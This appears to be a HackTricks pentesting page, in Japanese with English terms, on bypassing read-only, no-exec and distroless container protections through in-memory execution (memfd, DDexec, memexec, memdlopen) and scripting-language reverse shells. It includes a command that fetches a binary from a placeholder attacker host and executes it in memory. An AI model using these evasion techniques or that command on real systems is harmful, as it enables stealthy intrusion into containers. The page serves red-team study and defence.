# FS protectionsを bypass: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

以下の videos では、このページで言及している techniques をより詳しく解説しています:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

特に containers では、**read-only (ro) file system protection** が設定された Linux machines に遭遇することがますます一般的になっています。これは、`securitycontext` で **`readOnlyRootFilesystem: true`** を設定するだけで、ro file system の container を簡単に実行できるためです:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

ただし、file system が ro として mount されていても、**`/dev/shm`** は引き続き writable です。そのため、disk に何も write できないというのは誤りです。しかし、この folder は **no-exec protection** 付きで **mounted** されるため、ここに binary を download しても **execute できません**。

> [!WARNING]
> red team の観点では、これにより、system にすでに存在しない binary（backdoor や `kubectl` のような enumerator など）を **download して execute することが難しく**なります。

## 最も簡単な bypass: Scripts

ここでは binary について述べましたが、interpreter が machine 内に存在する限り、**任意の script を execute** できます。たとえば、`sh` が存在する場合は **shell script**、`python` が install されている場合は **python** **script** を実行できます。

しかし、これだけでは binary backdoor や、実行する必要のあるその他の binary tools を execute するには不十分です。

## Memory Bypasses

binary を execute したいものの、file system がそれを許可していない場合、最善の方法は **memory から execute すること**です。これは、**protections がそこには適用されない**ためです。

### FD + exec syscall bypass

machine 内に **Python**、**Perl**、**Ruby** などの強力な script engines がある場合、execute する binary を memory に download し、memory file descriptor（`create_memfd` syscall）に保存できます。この file descriptor はこれらの protections の対象にならず、その後、**fd を execute 対象の file として指定して** **`exec` syscall** を呼び出せます。

このために、[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project を簡単に利用できます。binary を渡すと、指定した language で script を生成します。この script には、**compressed and b64 encoded** された **binary** と、それを **decode and decompress** して、`create_memfd` syscall を呼び出して作成した **fd** に格納し、さらに **exec** syscall を呼び出して実行するための instructions が含まれます。

> [!WARNING]
> PHP や Node などの他の scripting languages では動作しません。これらには script から raw syscalls を呼び出す **default way** がないため、binary を保存する **memory fd** を作成するために `create_memfd` を呼び出すことができません。
>
> さらに、`/dev/shm` 内の file で **regular fd** を作成しても機能しません。**no-exec protection** が適用されるため、実行が許可されないからです。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、独自 process の memory を、その **`/proc/self/mem`** を上書きすることで **modify できる** technique です。

したがって、process によって実行されている **assembly code** を制御することで、**shellcode** を書き込み、process を「mutate」して **任意の code を execute** できます。

> [!TIP]
> **DDexec / EverythingExec** を使うと、独自の **shellcode** または **任意の binary** を **memory** から load して **execute** できます。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
この technique の詳細については、Github または以下を確認してください：

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec shellcode を daemon 化したもの**であるため、**別の binary を実行する**たびに DDexec を再起動する必要はありません。DDexec technique を使って memexec shellcode を実行し、その後、この daemon と **通信してロードおよび実行する新しい binary を渡す**だけです。

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) に、**PHP reverse shell から memexec を使って binary を実行する**方法の例があります。

### Memdlopen

DDexec と同様の目的で、[**memdlopen**](https://github.com/arget13/memdlopen) technique を使うと、後で実行する binary を memory に**より簡単にロード**できます。依存関係のある binary もロードできる可能性があります。

## Distroless Bypass

**distroless とは実際に何なのか**、いつ役立つのか、いつ役立たないのか、また container における post-exploitation の tradecraft がどのように変わるのかについて詳しくは、以下を確認してください：

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### distrolessとは

Distroless container には、libraries や runtime dependencies など、**特定の application や service を実行するために必要な最低限の components**のみが含まれています。一方で、package manager、shell、system utilities などの大きな components は除外されています。

Distroless container の目的は、**不要な components を排除して container の attack surface を縮小し**、悪用可能な vulnerabilities の数を最小限にすることです。

### Reverse Shell

distroless container では、通常の shell を取得するための **`sh` や `bash` すら見つからない**ことがあります。また、`ls`、`whoami`、`id` などの binary も見つかりません。つまり、system 上で通常実行するものが何もないのです。

> [!WARNING]
> したがって、通常の方法では **reverse shell** を取得したり、system を **enumerate** したりすることは**できません**。

ただし、侵害された container が例えば flask web を実行している場合は python がインストールされているため、**Python reverse shell** を取得できます。node を実行している場合は Node rev shell を取得でき、ほとんどすべての **scripting language** でも同様です。

> [!TIP]
> scripting language を使えば、その language の capabilities を利用して **system を enumerate** できます。

**`read-only/no-exec`** protections が存在しない場合は、reverse shell を悪用して **file system に binary を書き込み**、それらを**実行**できます。

> [!TIP]
> ただし、この種の container には通常これらの protections が存在します。その場合は、**以前に説明した memory execution techniques を使って bypass**できます。

**RCE vulnerabilities を exploit**して scripting languages の **reverse shells** を取得し、memory から binary を実行する方法の**例**は、[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) にあります。

## References

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
